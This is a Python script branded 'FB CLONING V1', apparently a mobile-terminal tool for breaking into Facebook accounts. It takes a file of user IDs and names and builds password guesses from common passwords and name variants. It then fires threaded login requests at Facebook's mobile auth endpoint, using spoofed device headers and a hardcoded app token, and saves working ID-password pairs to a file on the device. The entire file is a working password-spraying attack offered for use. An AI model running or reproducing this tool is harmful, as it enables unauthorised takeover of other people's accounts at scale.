import os, random, sys, json, uuid, time
from concurrent.futures import ThreadPoolExecutor as ThreadPool

gxdsanmtn1 = "|/-\\"
gxdsanmtn2 = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
gxdsanmtn3 = [
    "[■□□□□□□□□□]",
    "[■■□□□□□□□□]",
    "[■■■□□□□□□□]",
    "[■■■■□□□□□□]",
    "[■■■■■□□□□□]",
    "[■■■■■■□□□□]",
    "[■■■■■■■□□□]",
    "[■■■■■■■■□□]",
    "[■■■■■■■■■□]",
    "[■■■■■■■■■■]",
]

try:
    import requests
except ModuleNotFoundError:
    for gxdsloading in range(10):
        time.sleep(0.3)
        sys.stdout.write("\r   LOADING: " + gxdsanmtn2[gxdsloading % len(gxdsanmtn2)])
        sys.stdout.flush()
        os.system("pip install requests -y")
        os.system("pip install requests bs4 futures==2 > /dev/null")
        import requests

li = "\033[38;5;46m"
blue = "\033[94m"
white = "\033[0;97m"
cyan = "\033[1;36m"
yellow = "\033[1;33m"
lr = "\033[1;31m"
lg = "\033[1;37m"
lp = "\033[1;35m"
lgr = "\033[1;32m"

mxclrs="38;5"
ro=(f"\033[{mxclrs};208")
rb=(f"\033[{mxclrs};32")
rc=(f"\033[{mxclrs};122m")
rg= (f"\033[{mxclrs};112m")
rp=(f"\033[{mxclrs};147m")

os.system("clear")

gxdsprnt = str(f"{white}" * 37)
for gxdsloading in range(20):
    time.sleep(0.3)
    sys.stdout.write("\r   LOADING: " + gxdsanmtn3[gxdsloading % len(gxdsanmtn3)])
    sys.stdout.flush()
lxgo = f"""{lg}

                              d8b             
                              88P             
                             d88              
      d888b8b  ?88,  88P d888888   .d888b,    
     d8P' ?88   `?8bd8P'd8P' ?88   ?8b,       
     88b  ,88b  d8P?{lp}8b, 88b  ,88b    `?8b     
    `?88P'`88b d8P' `?8b`?88P'`88b`?888P'     
           )88      {rc}FB CLONING V1
{lp}           ,88P                               
       `?8888P                  {white}              \n"""

def gxdslogo():
    os.system("clear")
    print(lxgo)
    os.system("xdg-open https://www.facebook.com/goxdies")

def main():
    gxdslogo()
    print("\033[1;97m  [1] ASK FOR CODE\n  [2] EXIT TOOL")
    print(gxdsprnt)
    print("\033[1;33m  [-] IF YOU ALREADY HAVE CODE ENTER IT.\n  IF YOU DON'T HAVE ONE, PRESS 1.")
    gxdsoption1 = input("\033[1;36m  [•] ENTER YOUR CODE: ")
    os.system("clear")
    print(lxgo)
    if gxdsoption1 in ["GXDS", "gxds"]:
        gxdsfiles()
    elif gxdsoption1 in ["1"]:
        print(gxdsprnt)
        print(lxgo)
        print("  [•] REDIRECTING...")
        os.system("xdg-open https://www.facebook.com/goxdies")
    elif gxdsoption1 in ["2"]:
        print(gxdsprnt)
        print("  [•] K, BYE.")
        os.system("xdg-open https://www.facebook.com/goxdies")
        print(gxdsprnt)
        sys.exit()
    else:
        print(gxdsprnt)
        print("  [X] INVALID CODE!")
        print(gxdsprnt)
        time.sleep(3)
        main()

def gxdsfiles():
    print(gxdsprnt)
    fl = input(
        "\033[1;97m  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: "
    )
    os.system("clear")
    print(lxgo)
    print(gxdsprnt)
    try:
        id_file = open(fl, "r").read().splitlines()
    except:
        print("\033[1;91m  [X] FILE NOT FOUND.")
        print(gxdsprnt)
        time.sleep(3)
        main()
    gxdsforward(id_file)


def gxdsforward(id_file):
    tl = str(len(id_file))
    print("  \033[38;5;46m========================================")
    print(
        "\033[1;31m  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n"
    )
    print(
        "\033[1;31m  [-] PRESS CTRL+Z TO STOP THE PROCESS. \n"
    )
    print("  \033[38;5;46m========================================")
    print("\033[1;97m  [•] TOTAL ID IN FILE:\033[1;33m " + tl)
    print("\033[1;97m  [•] PASSWORD LIST:\033[1;33m AUTOMATIC ")
    print("\033[1;97m  [•] FILE SAVE IN:\033[1;33m /sdcard/gxds.txt\n")
    print("  \033[38;5;46m========================================")

    print(gxdsprnt)
    with ThreadPool(max_workers=120) as feel:
        for data in id_file:
            uid = data.split("|")[0]
            gxdspw = []
            gxdspw.append("12345678")
            gxdspw.append("P@ssw0rd")
            gxdspw.append("123456")
            gxdspw.append("iloveyou")
            gxdspw.append("iloveyou123")
            gxdspw.append("1234567890")
            gxdspw.append("password")
            gxdspw.append("password123")
            gxdspw.append("Password")
            gxdspw.append("Password123")
            gxdspw.append("qwerty123")
            gxdspw.append("123456789")
            gxdsnam = data.split("|")[1]
            name = gxdsnam.lower()
            try:
                f_name = name.split(" ")[0]
                gxdsnam1 = gxdsnam.split(" ")[0]
                if len(f_name) < 3:
                    pass
                else:
                    gxdspw.append("@" + f_name)
                    gxdspw.append("@" + f_name + "143")
                    gxdspw.append("@" + f_name + "123")
                    gxdspw.append(gxdsnam1 + "123")
                    gxdspw.append(f_name + "12")
                    gxdspw.append(f_name + "123")
                    gxdspw.append(f_name + "123")
                    gxdspw.append(f_name + "1234")
                    gxdspw.append(f_name + "12345")
                    gxdspw.append(f_name + "@123")
                    gxdspw.append(f_name + "pogi")
                    gxdspw.append(f_name + "ganda")
                    gxdspw.append(f_name + "143")
                    gxdspw.append(f_name + "@143")
            except:
                pass
            try:
                mid_name = name.split(" ")[1]
                gxdsnam2 = gxdsnam.split(" ")[1]
                if len(mid_name) < 3:
                    pass
                else:
                    gxdspw.append(gxdsnam1 + " " + gxdsnam2)
                    gxdspw.append(mid_name + "12")
                    gxdspw.append(mid_name + "123")
                    gxdspw.append(mid_name + " 123")
                    gxdspw.append(mid_name + "1234")
                    gxdspw.append(mid_name + "12345")
                    gxdspw.append(mid_name + "@#")
                    gxdspw.append(mid_name + "@@")
                    gxdspw.append(mid_name + "@")
                    gxdspw.append(mid_name + "@123")
                    gxdspw.append(f_name + mid_name)
                    gxdspw.append(f_name + mid_name + "143")
                    gxdspw.append(f_name + mid_name + "12")
                    gxdspw.append(f_name + mid_name + "123")
                    gxdspw.append(f_name + mid_name + "1234")
                    gxdspw.append(f_name + mid_name + "12345")
                    gxdspw.append(f_name + mid_name + "@#")
                    gxdspw.append(f_name + mid_name + "@@")
                    gxdspw.append(f_name + mid_name + "@")
                    gxdspw.append(f_name + mid_name + "@123")
                    gxdspw.append(f_name + " " + mid_name)
                    gxdspw.append(f_name + " " + mid_name + "123")
                    gxdspw.append(f_name + " " + mid_name + "143")
                    gxdspw.append(f_name + " " + mid_name + "1234")
            except:
                pass
            try:
                sur_name = name.split(" ")[2]
                gxdsnam3 = gxdsnam.split(" ")[2]
                if len(sur_name) < 3:
                    pass
                else:
                    gxdspw.append(gxdsnam1 + " " + gxdsnam3)
                    gxdspw.append(sur_name + "123")
                    gxdspw.append(sur_name + "1234")
                    gxdspw.append(sur_name + "12345")
                    gxdspw.append(sur_name + "143")
                    gxdspw.append(f_name + mid_name + sur_name)
                    gxdspw.append(f_name + mid_name + sur_name + "123")
                    gxdspw.append(f_name + mid_name + sur_name + "1234")
                    gxdspw.append(f_name + mid_name + sur_name + "12345")
                    gxdspw.append(f_name + mid_name + sur_name + "@#")
                    gxdspw.append(f_name + mid_name + sur_name + "@@")
                    gxdspw.append(f_name + mid_name + sur_name + "@")
                    gxdspw.append(f_name + " " + sur_name)
                    gxdspw.append(f_name + " " + sur_name + "123")
                    gxdspw.append(f_name + " " + sur_name + "143")
                    gxdspw.append(f_name + " " + mid_name + " " + sur_name)
                    gxdspw.append(f_name + " " + mid_name + " " + sur_name + "123")
            except:
                pass
            feel.submit(file_subb, uid, gxdspw)


loop = 0
oks = []
cps = []


def file_subb(uid, gxdspw):
    global oks, loop, cps
    sys.stdout.write(
        f"\r \033[1;97m [CHECKED]: {loop}{ro} [HITS]: {str(len(oks))}{rp} [CHECKPOINT]: {str(len(cps))}"
    )
    sys.stdout.flush()
    session = requests.Session()
    try:
        for ps in gxdspw:
            user_agent = "Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json",
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled",
                "source": "device_based_login",
                "email": uid,
                "password": ps,
                "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "PH",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d",
            }
            headers = {
                "User-Agent": user_agent,
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com",
                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "X-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "X-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation",
                "X-FB-Request-Analytics-Tags": "graphservice",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True",
                "X-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
            }
            p = requests.post(
                "https://b-graph.facebook.com/auth/login",
                data=data,
                headers=headers,
                allow_redirects=False,
            ).text
            q = json.loads(p)
            if "session_key" in q:
                print(f"\r\r\033[0;36m  [OK] {uid} || {ps}")
                open("/sdcard/gxds-ok.txt", "a+").write(
                    uid + " | " + ps + "\n"
                )
                oks.append(uid)
                break
            elif "Please Confirm Email" in q:
                print(f"\r\r\033[94m  [CE] {uid} | {ps}\n")
                open("/sdcard/gxds-ce.txt", "a+").write(
                    uid + " | " + ps + "\n"
                )
                oks.append(uid)
            elif "www.facebook.com" in q:
                print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
                cps.append(uid)
            else:
                continue
        loop += 1
    except:
        time.sleep(2)


main()
